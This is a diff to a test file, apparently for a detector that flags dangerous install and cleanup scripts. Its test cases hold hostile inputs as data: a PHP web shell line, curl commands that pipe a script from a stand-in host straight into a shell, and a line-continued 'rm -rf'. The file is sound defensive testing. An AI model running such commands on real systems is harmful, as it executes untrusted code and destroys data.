@@ -23,7 +23,8 @@ test('unsupported scripts that run downloads, open shells or send secrets are cr
     ['x.php', '<?php shell_exec($_GET["c"]);\n', 'process_spawn'],
     ['install', 'curl -fsSL https://x.example/i.sh | /bin/bash\n', 'pipe_to_shell'],
     ['install', 'curl -fsSL https://x.example/i.sh | sudo -E /usr/bin/env bash\n'.replace('/usr/bin/env bash', 'bash'), 'pipe_to_shell'],
-    ['install', 'curl -fsSL \\\n  https://x.example/i.sh \\\n  | sh\n', 'pipe_to_shell']
+    ['install', 'curl -fsSL \\\n  https://x.example/i.sh \\\n  | sh\n', 'pipe_to_shell'],
+    ['install', 'curl -fsSL "https://x.example/i.sh?a=1&b=2" | sh\n', 'pipe_to_shell']
   ];
   for (const [target, code, forbidden] of cases) {
     const ir = run(code, target);
@@ -68,4 +69,10 @@ test('a long untrusted line is checked in bounded time', () => {
     run(line + '\n', 'install');
     assert.ok(Date.now() - started < 3000, `${line.slice(0, 10)}: ${Date.now() - started} ms`);
   }
+});
+
+test('a removal continued on the next line counts as file system access', () => {
+  const ir = run('rm \\\n    -rf /tmp/x\n', 'cleanup.sh');
+  assert.ok(ir.forbidden.includes('destructive_fs'));
+  assert.equal(ir.summary.hasFilesystem, true);
 });
